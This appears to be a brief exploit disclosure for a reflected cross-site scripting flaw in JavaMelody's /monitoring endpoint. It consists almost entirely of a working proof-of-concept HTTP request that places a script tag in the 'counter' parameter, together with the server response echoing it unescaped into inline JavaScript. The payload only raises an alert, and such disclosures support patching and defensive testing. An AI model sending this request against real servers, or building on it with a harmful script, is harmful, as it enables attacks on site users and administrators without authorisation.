# JavaMelody 1.60.0 vulnerability Cross-Site Scripting
# This vulnerability maybe affected version <= 1.72.0

Request:
--------------------------------------------------------------------------------
GET /monitoring?action=clear_counter&counter=<script>alert(1)</script> HTTP/1.1
Host: victim
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
--------------------------------------------------------------------------------


Response:
--------------------------------------------------------------------------------
HTTP/1.0 200 OK
Date: Wed, 13 Jun 2018 09:52:54 GMT
Server:
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Cache-Control: no-cache
Pragma: no-cache
Expires: -1
Vary: Accept-Encoding
Content-Type: text/html;charset=UTF-8
Connection: close


---
---

<script type='text/javascript'>
alert("Statistics <script>alert(1)</script> cleared.");
if (location.href.indexOf('?') != -1) {
location.href = location.href.substring(0, location.href.indexOf('?')) + '#<script>alert(1)</script>';} else {
location.href = '#<script>alert(1)</script>';}
</script>
--------------------------------------------------------------------------------
